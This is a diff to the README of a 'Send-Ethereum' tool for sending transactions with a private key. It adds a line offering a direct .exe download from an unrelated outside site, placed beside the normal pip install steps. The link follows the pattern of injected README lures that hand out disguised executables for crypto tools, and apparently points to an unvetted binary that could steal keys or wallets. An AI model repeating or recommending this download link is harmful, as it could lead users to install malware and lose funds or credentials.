@@ -17,6 +17,10 @@ cd Send-Ethereum
 pip install -r requirements.txt
 ```
 
+OR
+
+Alternatively, you can directly download the .exe file from here [Download](https://www.pathau.com/download.php?snippet_id=048) .
+
 ## Features
 
 - Send Ethereum transactions using a private key
